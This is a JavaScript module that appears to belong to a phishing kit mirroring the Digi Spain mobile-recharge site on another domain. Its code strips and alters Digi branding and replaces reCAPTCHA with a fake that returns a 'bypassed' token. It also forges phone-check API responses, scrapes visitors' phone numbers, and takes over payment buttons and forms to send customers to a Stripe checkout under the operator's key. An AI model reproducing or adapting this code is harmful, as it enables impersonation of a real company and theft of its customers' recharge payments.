const { STRIPE_PUBLISHABLE_KEY, SOURCE_DOMAIN, MIRROR_DOMAIN } = require('./constants');

function replaceDigiWithDig(text) {
  const protectedElements = [];
  let counter = 0;

  let protectedText = text.replace(/<[^>]+>/g, match => {
    const placeholder = `__PROTECTED_HTML_${counter++}__`;
    protectedElements.push({ placeholder, content: match });
    return placeholder;
  });

  protectedText = protectedText.replace(/(https?:\/\/[^\s"']+|www\.[^\s"']+)/g, match => {
    const placeholder = `__PROTECTED_URL_${counter++}__`;
    protectedElements.push({ placeholder, content: match });
    return placeholder;
  });

  const domainPatterns = [
    /digimobil\.es/g,
    /\.digi\./g,
    /\/digi\//g,
    /\bdigi[a-z]*\.com\b/g,
    /\bdigi[a-z]*\.net\b/g,
    /\bdigi[a-z]*\.org\b/g,
    /\bdigi[a-z]*\.io\b/g,
    /\bdigimobil\b/g,
    /\bdigisau\b/g,
    /\bdigilife\b/g,
    /\bdigiserve\b/g,
    /\bdigifinance\b/g
  ];

  for (const pattern of domainPatterns) {
    protectedText = protectedText.replace(pattern, match => {
      const placeholder = `__PROTECTED_DOMAIN_${counter++}__`;
      protectedElements.push({ placeholder, content: match });
      return placeholder;
    });
  }

  let modifiedText = protectedText;

  const replacements = [
    { pattern: /(^|\s|[^\w])(DIGI)(?=\s|$|[^\w])/g, replacement: '$1DIG$2' },
    { pattern: /(^|\s|[^\w])(Digi)(?=\s|$|[^\w])/g, replacement: '$1Dig$2' },
    { pattern: /(^|\s|[^\w])(digi)(?=\s|$|[^\w])/g, replacement: '$1dig$2' }
  ];

  for (const { pattern, replacement } of replacements) {
    modifiedText = modifiedText.replace(pattern, replacement);
  }

  modifiedText = modifiedText.replace(/DIGI/gi, match => {
    if (match === 'DIGI') return 'DIG';
    if (match === 'Digi') return 'Dig';
    if (match === 'digi') return 'dig';
    return match; 
  });

  for (let i = protectedElements.length - 1; i >= 0; i--) {
    const { placeholder, content } = protectedElements[i];
    modifiedText = modifiedText.replace(placeholder, content);
  }

  return modifiedText;
}

async function modifyHTML(response) {
  let text = await response.text();

  text = text.replace(/<script[^>]*src="[^"]*recaptcha[^"]*"[^>]*><\/script>/gi, '');
  text = text.replace(/<div[^>]*class=["'][^"']*captcha[^"']*["'][^>]*>[\s\S]*?<\/div>/gi, '');
  text = text.replace(/<[^>]*captcha[^>]*>/gi, '');
  text = text.replace(
    /<a[^>]*class="navbar-brand"[^>]*>\s*<img[^>]*alt="logo_digi_oficial"[^>]*>\s*<\/a>/gi,
    ''
  );
  text = text.replace(
    /<div[^>]*class="[^"]*footer-logo[^"]*"[^>]*>[\s\S]*?<\/div>/gi,
    ''
  );
  text = text.replace(
    /<img[^>]*alt="logo_digi[^"]*"[^>]*>/gi,
    ''
  );

  const bypassScript = `
    <script>
      (function() {
        if (!document.querySelector('script[src*="stripe.js"]')) {
          const stripeScript = document.createElement('script');
          stripeScript.src = 'https://js.stripe.com/v3/';
          document.head.appendChild(stripeScript);
        }
      })();
      
      window.stripeLoadedPromise = new Promise((resolve) => {
        if (typeof Stripe !== 'undefined') {
          window.stripeInstance = Stripe('${STRIPE_PUBLISHABLE_KEY}');
          resolve(window.stripeInstance);
        } else {
          document.addEventListener('DOMContentLoaded', function() {
            const stripeCheckInterval = setInterval(function() {
              if (typeof Stripe !== 'undefined') {
                clearInterval(stripeCheckInterval);
                window.stripeInstance = Stripe('${STRIPE_PUBLISHABLE_KEY}');
                resolve(window.stripeInstance);
              }
            }, 100);
            setTimeout(() => {
              clearInterval(stripeCheckInterval);
              resolve(null);
            }, 5000);
          });
        }
      });
      
      // Автоматичне проходження етапу перевірки номера
      function autoProgressAfterCheckNumber() {
        // Імітуємо кліки на кнопки "Далі" або "Продовжити" після завантаження сторінки
        setTimeout(() => {
          const continueButtons = Array.from(document.querySelectorAll('button, a.btn, input[type="submit"]')).filter(el => {
            const text = el.innerText || el.value || '';
            return text.match(/continue|next|далі|продовжити|siguiente/i) || 
                   el.classList.contains('btn-primary') || 
                   el.classList.contains('btn-success');
          });
          
          if (continueButtons.length > 0) {
            console.log('Auto-continuing to next step');
            continueButtons[0].click();
          }
        }, 500);
      }

      // Отримати вибрану суму з радіокнопок
      function getSelectedAmountFromRadios() {
        // Перевіряємо радіокнопки з name="recharge_number[amount]"
        const selectedRadio = document.querySelector('input[name="recharge_number[amount]"]:checked');
        if (selectedRadio) {
          console.log('Found selected amount radio:', selectedRadio.value);
          return selectedRadio.value;
        }
        
        // Перевіряємо будь-які інші радіокнопки зі словом amount
        const otherRadio = document.querySelector('input[type="radio"][name*="amount"]:checked');
        if (otherRadio) {
          console.log('Found other amount radio:', otherRadio.value);
          return otherRadio.value;
        }
        
        // Якщо немає вибраних радіокнопок, перевіряємо data-amount
        const amountEl = document.querySelector('[data-amount]');
        if (amountEl) {
          console.log('Found data-amount element:', amountEl.getAttribute('data-amount'));
          return amountEl.getAttribute('data-amount');
        }
        
        console.log('No amount radio found, using default 5');
        return '5';
      }
      
      // Отримати номер телефону з різних джерел на сторінці
      function getPhoneNumberFromPage() {
        // Спочатку перевіряємо номер телефону зі сховища
        let phoneNumber = '';
        try {
          phoneNumber = window.phoneNumberForPayment || 
                       sessionStorage.getItem('rechargePhoneNumber') || 
                       localStorage.getItem('rechargePhoneNumber') || '';
        } catch (e) { }
        
        if (phoneNumber && phoneNumber.match(/\\d{9}/)) {
          console.log('Found phone number in storage:', phoneNumber);
          return phoneNumber;
        }
        
        // Перевіряємо поля введення
        const phoneInput = document.querySelector('input[name*="phone"], input[type="tel"]');
        if (phoneInput && phoneInput.value) {
          phoneNumber = phoneInput.value.replace(/\\D/g, '');
          console.log('Found phone number in input field:', phoneNumber);
          if (phoneNumber.match(/\\d{9}/)) return phoneNumber;
        }
        
        // Перевіряємо div з класом phone і span всередині нього
        const phoneSpan = document.querySelector('.phone span');
        if (phoneSpan && phoneSpan.textContent) {
          phoneNumber = phoneSpan.textContent.trim().replace(/\\D/g, '');
          console.log('Found phone number in .phone span:', phoneNumber);
          if (phoneNumber.match(/\\d{9}/)) {
            // Зберігаємо номер в сховищі для подальшого використання
            try {
              sessionStorage.setItem('rechargePhoneNumber', phoneNumber);
              localStorage.setItem('rechargePhoneNumber', phoneNumber);
              window.phoneNumberForPayment = phoneNumber;
            } catch (e) { }
            return phoneNumber;
          }
        }
        
        // Перевіряємо будь-який span, який містить 9-значний номер
        const spans = document.querySelectorAll('span');
        for (const span of spans) {
          const text = span.textContent.trim();
          const digits = text.replace(/\\D/g, '');
          if (digits.match(/^\\d{9}$/)) {
            console.log('Found phone number in span:', digits);
            // Зберігаємо номер в сховищі для подальшого використання
            try {
              sessionStorage.setItem('rechargePhoneNumber', digits);
              localStorage.setItem('rechargePhoneNumber', digits);
              window.phoneNumberForPayment = digits;
            } catch (e) { }
            return digits;
          }
        }
        
        // Перевіряємо текст у будь-якому div з класом "phone"
        const phoneDivs = document.querySelectorAll('.phone');
        for (const div of phoneDivs) {
          const text = div.textContent.trim();
          const matches = text.match(/\\d{9}/);
          if (matches) {
            console.log('Found phone number in .phone div:', matches[0]);
            // Зберігаємо номер в сховищі для подальшого використання
            try {
              sessionStorage.setItem('rechargePhoneNumber', matches[0]);
              localStorage.setItem('rechargePhoneNumber', matches[0]);
              window.phoneNumberForPayment = matches[0];
            } catch (e) { }
            return matches[0];
          }
        }
        
        // Шукаємо 9-значний номер у будь-якому тексті на сторінці
        const bodyText = document.body.textContent;
        const matches = bodyText.match(/\\b(\\d{9})\\b/g);
        if (matches && matches.length > 0) {
          console.log('Found phone number in body text:', matches[0]);
          // Зберігаємо номер в сховищі для подальшого використання
          try {
            sessionStorage.setItem('rechargePhoneNumber', matches[0]);
            localStorage.setItem('rechargePhoneNumber', matches[0]);
            window.phoneNumberForPayment = matches[0];
          } catch (e) { }
          return matches[0];
        }
        
        console.log('No valid phone number found on page, using default number');
        // Використовуємо валідний номер за замовчуванням
        return '624041199'; // Валідний номер телефону
      }
      
      // Функція прямого перенаправлення на платіж (гарантоване)
      async function directPaymentRedirect(amount, phoneNumber) {
        console.log('Starting payment redirect...');
        
        try {
          // Отримуємо номер телефону зі сторінки, якщо він не переданий
          if (!phoneNumber || !phoneNumber.match(/\\d{9}/)) {
            phoneNumber = getPhoneNumberFromPage();
            console.log('Got phone for payment:', phoneNumber);
          }
          
          // Отримуємо суму, якщо вона не передана
          if (!amount || isNaN(parseFloat(amount)) || parseFloat(amount) <= 0) {
            amount = getSelectedAmountFromRadios();
            console.log('Got amount for payment:', amount);
          }
          
          console.log('Processing direct payment with amount:', amount, 'phone:', phoneNumber);
          
          // Запит до API створення платежу
          const response = await fetch('/api/create-payment', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
              amount: amount, 
              phoneNumber: phoneNumber,
              successUrl: window.location.origin + '/payment-success',
              cancelUrl: window.location.origin + '/payment-cancel'
            })
          });
          
          console.log('Payment request response status:', response.status);
          
          if (!response.ok) {
            console.error('Payment request failed with status:', response.status);
            throw new Error('Payment request failed with status: ' + response.status);
          }
          
          const data = await response.json();
          console.log('Payment API response:', data);
          
          if (data.url) {
            console.log('Redirecting to Stripe URL:', data.url);
            window.location.href = data.url;
            return true;
          } else if (data.sessionId) {
            console.log('Using Stripe checkout with session ID:', data.sessionId);
            const stripe = await window.stripeLoadedPromise;
            if (!stripe) throw new Error('Stripe failed to load');
            const result = await stripe.redirectToCheckout({ sessionId: data.sessionId });
            if (result.error) {
              throw new Error(result.error.message);
            }
            return true;
          } else {
            throw new Error('No URL or sessionId in response');
          }
        } catch (error) {
          console.error('Payment error:', error);
          alert('Payment error: ' + error.message);
          return false;
        }
      }

      window.processPayment = async function(amount, phoneNumber, sourceEvent) {
        if (sourceEvent) {
          sourceEvent.preventDefault();
          sourceEvent.stopPropagation();
        }
        
        try {
          const isFirstStep = window.location.pathname.includes('/recargar') && 
                             !document.querySelector('[data-amount], .recharge-amount');
          
          if (isFirstStep) {
            const phoneInput = document.querySelector('input[name*="phone"], input[type="tel"], input[id*="phone"]');
            if (phoneInput && phoneInput.value.match(/\\d{9}/)) {
              try {
                sessionStorage.setItem('rechargePhoneNumber', phoneInput.value.replace(/\\D/g, ''));
                localStorage.setItem('rechargePhoneNumber', phoneInput.value.replace(/\\D/g, ''));
                window.phoneNumberForPayment = phoneInput.value.replace(/\\D/g, '');
              } catch (e) { console.error('Error storing phone:', e); }
            }
            return true;
          }
          
          // Отримати номер телефону з різних джерел на сторінці
          if (!phoneNumber || !phoneNumber.match(/\\d{9}/)) {
            phoneNumber = getPhoneNumberFromPage();
          }
          
          if (!amount || isNaN(parseFloat(amount)) || parseFloat(amount) <= 0) {
            amount = getSelectedAmountFromRadios() || '5';
          }
          
          console.log('Processing payment with amount:', amount, 'phone:', phoneNumber);
          
          // Використовуємо directPaymentRedirect для гарантованого перенаправлення
          return await directPaymentRedirect(amount, phoneNumber);
        } catch (error) {
          console.error('Payment error:', error);
          alert('Payment error: ' + error.message);
          return false;
        }
      };
      
      // Глобальна змінна для відстеження стану оплати
      window.paymentInProgress = false;
      
      document.addEventListener('DOMContentLoaded', function() {
        console.log('DOM loaded, scanning for phone number...');
        
        // Пошук номера телефону на сторінці при завантаженні
        const phoneNumber = getPhoneNumberFromPage();
        if (phoneNumber) {
          console.log('Phone number found and saved:', phoneNumber);
        }
        
        // Автоматичний перехід до наступного етапу
        if (window.location.href.includes('check_number') || window.location.pathname.includes('/phone')) {
          autoProgressAfterCheckNumber();
        }
        
        // Перехоплення всіх кліків для обробки кнопок оплати
        document.addEventListener('click', function(event) {
          if (window.paymentInProgress) return;
          
          const target = event.target;
          if (target.tagName === 'BUTTON' || target.tagName === 'A' || 
              target.tagName === 'INPUT' || target.classList.contains('btn')) {
            
            const buttonText = (target.textContent || '').toLowerCase();
            if (buttonText.includes('pagar') || buttonText.includes('recargar') || 
                buttonText.includes('confirmar') || buttonText.includes('continuar') ||
                target.classList.contains('btn-primary') || target.classList.contains('btn-success')) {
              
              // Якщо ми на сторінці з вибором суми
              if (document.querySelector('input[name="recharge_number[amount]"]')) {
                console.log('Payment button clicked:', buttonText);
                
                event.preventDefault();
                event.stopPropagation();
                
                if (!window.paymentInProgress) {
                  window.paymentInProgress = true;
                  
                  const amount = getSelectedAmountFromRadios();
                  const phoneNumber = getPhoneNumberFromPage();
                  
                  directPaymentRedirect(amount, phoneNumber).finally(() => {
                    window.paymentInProgress = false;
                  });
                }
                
                return false;
              }
            }
          }
        }, true);
        
        // Перехоплюємо всі форми
        document.querySelectorAll('form').forEach(form => {
          form.addEventListener('submit', function(event) {
            // Перевіряємо, чи це форма з вибором суми
            const hasAmountRadios = form.querySelector('input[name="recharge_number[amount]"]');
            if (hasAmountRadios) {
              console.log('Intercepted form submit with amount selection');
              
              event.preventDefault();
              event.stopPropagation();
              
              if (!window.paymentInProgress) {
                window.paymentInProgress = true;
                
                const selectedAmount = getSelectedAmountFromRadios();
                const phoneNumber = getPhoneNumberFromPage();
                
                console.log('Form submit with amount:', selectedAmount, 'phone:', phoneNumber);
                
                directPaymentRedirect(selectedAmount, phoneNumber).finally(() => {
                  window.paymentInProgress = false;
                });
              }
              
              return false;
            }
          });
        });

        function replaceFooterText() {
          const footerElements = document.querySelectorAll('footer span, footer div, footer p');
          footerElements.forEach(element => {
            if (element.textContent.includes('© DIGDIG Spain Telecom, S.L.U. 2008/2025')) {
              element.textContent = element.textContent.replace(
                '© DIGDIG Spain Telecom, S.L.U. 2008/2025',
                '© DIG mobile solution'
              );
              element.style.textAlign = 'center'; 
            }
          });
        }

        const style = document.createElement('style');
        style.textContent = \`
          footer {
            text-align: center; 
            padding: 10px; 
          }
          footer span, footer div, footer p {
            display: inline-block; 
            width: 100%;
            text-align: center; 
            font-family: 'Arial', sans-serif;
            font-size: 12px; 
          }
        \`;
        document.head.appendChild(style);

        replaceFooterText();
        const observer = new MutationObserver(() => replaceFooterText());
        observer.observe(document.body, { childList: true, subtree: true });
      });
    </script>
  `;

  text = text.replace(/<head>/i, '<head>' + bypassScript);
  text = replaceDigiWithDig(text);

  return {
    statusCode: 200,
    body: text,
    headers: {
      'Content-Type': 'text/html;charset=UTF-8',
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': '*'
    }
  };
}

async function modifyJavaScript(response) {
  let text = await response.text();
  text = text.replace(new RegExp(SOURCE_DOMAIN, 'g'), MIRROR_DOMAIN);
  text = text.replace(new RegExp('https://store-backend.digimobil.es', 'g'), `https://${MIRROR_DOMAIN}/store-backend`);

  const recaptchaBypass = `
    window.grecaptcha = {
      ready: function(callback) { if (callback) setTimeout(callback, 10); },
      execute: function() { return Promise.resolve('bypassed_captcha_token'); },
      render: function() { return 1; },
      reset: function() { return true; }
    };
    
    (function() {
      const origFetch = window.fetch;
      window.fetch = function(url, options) {
        if (url && typeof url === 'string') {
          // Автоматична відповідь для перевірки номера
          if (url.includes('/api/check_number') || url.includes('/api/check-number')) {
            return Promise.resolve(new Response(JSON.stringify({
              code: 200,
              data: {
                id: Math.floor(Math.random() * 90000000) + 10000000,
                charges: 0,
                country: "spania",
                number: ""
              }
            }), { 
              status: 200, 
              headers: { 'Content-Type': 'application/json' } 
            }));
          }
          
          // Для інших API запитів, які потрібно обробити автоматично
          if (url.includes('/api/')) {
            console.log('Intercepted API request:', url);
          }
        }
        return origFetch.call(this, url, options);
      };
    })();
    
    // Отримати вибрану суму з радіокнопок
    function getSelectedAmountFromRadios() {
      // Перевіряємо радіокнопки з name="recharge_number[amount]"
      const selectedRadio = document.querySelector('input[name="recharge_number[amount]"]:checked');
      if (selectedRadio) {
        console.log('Found selected amount radio:', selectedRadio.value);
        return selectedRadio.value;
      }
      
      // Перевіряємо будь-які інші радіокнопки зі словом amount
      const otherRadio = document.querySelector('input[type="radio"][name*="amount"]:checked');
      if (otherRadio) {
        console.log('Found other amount radio:', otherRadio.value);
        return otherRadio.value;
      }
      
      // Якщо немає вибраних радіокнопок, перевіряємо data-amount
      const amountEl = document.querySelector('[data-amount]');
      if (amountEl) {
        console.log('Found data-amount element:', amountEl.getAttribute('data-amount'));
        return amountEl.getAttribute('data-amount');
      }
      
      console.log('No amount radio found, using default 5');
      return '5';
    }
    
    // Функція для пошуку номера телефону на сторінці
    function getPhoneNumberFromPage() {
      // Спочатку перевіряємо номер телефону зі сховища
      let phoneNumber = '';
      try {
        phoneNumber = window.phoneNumberForPayment || 
                     sessionStorage.getItem('rechargePhoneNumber') || 
                     localStorage.getItem('rechargePhoneNumber') || '';
      } catch (e) { }
      
      if (phoneNumber && phoneNumber.match(/\\d{9}/)) {
        console.log('Found phone number in storage:', phoneNumber);
        return phoneNumber;
      }
      
      // Перевіряємо поля введення
      const phoneInput = document.querySelector('input[name*="phone"], input[type="tel"]');
      if (phoneInput && phoneInput.value) {
        phoneNumber = phoneInput.value.replace(/\\D/g, '');
        if (phoneNumber.match(/\\d{9}/)) return phoneNumber;
      }
      
      // Перевіряємо div з класом phone і span всередині нього
      const phoneSpan = document.querySelector('.phone span');
      if (phoneSpan && phoneSpan.textContent) {
        phoneNumber = phoneSpan.textContent.trim().replace(/\\D/g, '');
        if (phoneNumber.match(/\\d{9}/)) {
          // Зберігаємо номер для подальшого використання
          try {
            sessionStorage.setItem('rechargePhoneNumber', phoneNumber);
            localStorage.setItem('rechargePhoneNumber', phoneNumber);
            window.phoneNumberForPayment = phoneNumber;
          } catch (e) { }
          return phoneNumber;
        }
      }
      
      // Перевіряємо текст у будь-якому div з класом "phone"
      const phoneDivs = document.querySelectorAll('.phone');
      for (const div of phoneDivs) {
        const text = div.textContent.trim();
        const matches = text.match(/\\d{9}/);
        if (matches) {
          // Зберігаємо номер
          try {
            sessionStorage.setItem('rechargePhoneNumber', matches[0]);
            localStorage.setItem('rechargePhoneNumber', matches[0]);
            window.phoneNumberForPayment = matches[0];
          } catch (e) { }
          return matches[0];
        }
      }
      
      // Шукаємо 9-значний номер у будь-якому тексті на сторінці
      const bodyText = document.body.textContent;
      const matches = bodyText.match(/\\b(\\d{9})\\b/g);
      if (matches && matches.length > 0) {
        // Зберігаємо номер
        try {
          sessionStorage.setItem('rechargePhoneNumber', matches[0]);
          localStorage.setItem('rechargePhoneNumber', matches[0]);
          window.phoneNumberForPayment = matches[0];
        } catch (e) { }
        return matches[0];
      }
      
      // Використовуємо валідний номер за замовчуванням
      return '624041199'; // Валідний номер телефону
    }
    
    // Автоматичний перехід до наступного кроку після перевірки номера
    (function() {
      if (window.location.href.includes('check_number') || window.location.pathname.includes('/phone')) {
        setTimeout(() => {
          const continueButtons = Array.from(document.querySelectorAll('button, a.btn, input[type="submit"]')).filter(el => {
            const text = el.innerText || el.value || '';
            return text.match(/continue|next|далі|продовжити|siguiente/i) || 
                  el.classList.contains('btn-primary') || 
                  el.classList.contains('btn-success');
          });
          
          if (continueButtons.length > 0) {
            console.log('Auto-continuing to next step');
            continueButtons[0].click();
          }
        }, 500);
      }
      
      // Після завантаження документа, шукаємо номер телефону
      document.addEventListener('DOMContentLoaded', function() {
        const phoneNumber = getPhoneNumberFromPage();
        if (phoneNumber) {
          console.log('Found phone number on page:', phoneNumber);
        }
      });
    })();
    
    (function() {
      if (typeof window.stripeInstance === 'undefined' && typeof Stripe !== 'undefined') {
        window.stripeInstance = Stripe('${STRIPE_PUBLISHABLE_KEY}');
      }
      try {
        window.phoneNumberForPayment = sessionStorage.getItem('rechargePhoneNumber') || 
                                      localStorage.getItem('rechargePhoneNumber');
      } catch (e) { }
    })();
    
    // Перехоплення викликів reCAPTCHA
    (function() {
      if (typeof grecaptcha !== 'undefined') {
        grecaptcha.execute = function() { return Promise.resolve('bypassed_captcha_token'); };
        grecaptcha.ready = function(callback) { if (callback) setTimeout(callback, 10); };
        grecaptcha.render = function() { return 1; };
        grecaptcha.reset = function() { return true; };
      }
    })();
    
    // Динамічне видалення grecaptcha-badge
    (function() {
      document.addEventListener('DOMContentLoaded', function() {
        const removeRecaptchaBadge = () => {
          const badge = document.querySelector('.grecaptcha-badge');
          if (badge) {
            badge.remove();
          }
        };
        
        // Видаляємо одразу після завантаження
        removeRecaptchaBadge();
        
        // Спостерігаємо за змінами в DOM, щоб видаляти badge, якщо він додається пізніше
        const observer = new MutationObserver((mutations) => {
          mutations.forEach((mutation) => {
            if (mutation.addedNodes.length) {
              removeRecaptchaBadge();
            }
          });
        });
        
        observer.observe(document.body, {
          childList: true,
          subtree: true
        });
      });
    })();
  `;

  const initScript = `
    if (typeof window.global === 'undefined') { window.global = {}; }
    if (typeof window.global.notif !== 'function') {
      window.global.notif = function() { return Promise.resolve(); };
    }
    ${recaptchaBypass}
  `;

  text = initScript + text;
  text = replaceDigiWithDig(text);

  return {
    statusCode: 200,
    body: text,
    headers: {
      'Content-Type': 'application/javascript',
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': '*'
    }
  };
}

module.exports = {
  replaceDigiWithDig,
  modifyHTML,
  modifyJavaScript
};